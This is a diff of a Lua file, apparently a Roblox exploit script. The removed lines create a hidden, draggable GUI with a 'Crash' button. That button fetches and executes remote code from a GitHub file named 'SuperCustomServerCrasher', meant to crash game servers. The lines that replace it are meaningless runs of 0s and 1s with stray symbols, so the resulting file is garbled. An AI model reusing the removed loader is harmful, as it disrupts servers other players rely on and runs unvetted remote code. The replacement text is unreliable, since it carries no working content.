@@ -1,49 +1,30 @@
-local ScreenGui = Instance.new("ScreenGui")
-local main = Instance.new("Frame")
-local UICorner = Instance.new("UICorner")
-local TextButton = Instance.new("TextButton")
+10100101011111111111111100101010010101010101
 
---Properties:
+10
+0110
+01101010101001010100
+01
+01
+010
+1010110011001101101010-01
+001110
+10
 
-ScreenGui.Parent = game.CoreGui
+1
+00
+10
+10
+10
+0
+10]
 
-main.Name = "main"
-main.Parent = ScreenGui
-main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-main.Position = UDim2.new(0.165694296, 0, 0.68986088, 0)
-main.Size = UDim2.new(0, 81, 0, 42)
-main.Active = true
-main.Draggable = true
+10
+010
+1`0
+0`
 
-UICorner.CornerRadius = UDim.new(0, 13)
-UICorner.Parent = main
+10
 
-TextButton.Parent = main
-TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextButton.BackgroundTransparency = 1.000
-TextButton.Position = UDim2.new(0.291997463, 0, 0, 0)
-TextButton.Size = UDim2.new(0, 35, 0, 42)
-TextButton.Font = Enum.Font.SourceSans
-TextButton.Text = "Crash"
-TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextButton.TextSize = 27.000
-TextButton.MouseButton1Click:Connect(function()
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
-end)
-
--- Scripts:
-
-local function TDAVCMV_fake_script() -- main.LocalScript 
-	local script = Instance.new('LocalScript', main)
-
-	local frame = script.Parent -- path to the frame
-	local mouse = game:GetService('Players').LocalPlayer:GetMouse(); -- we need the mouse object, which also has the keyboard
-	
-	mouse.KeyDown:connect(function(key) -- whenever a key is pushed down
-		key = key:lower() -- i do this in all my key events, though i don't remember why
-		if key == 'q' then -- if key pressed is h
-			frame.Visible = not frame.Visible -- flip between visible/invisible
-		end
-	end)
-end
-coroutine.wrap(TDAVCMV_fake_script)()
+01`
+0
+01
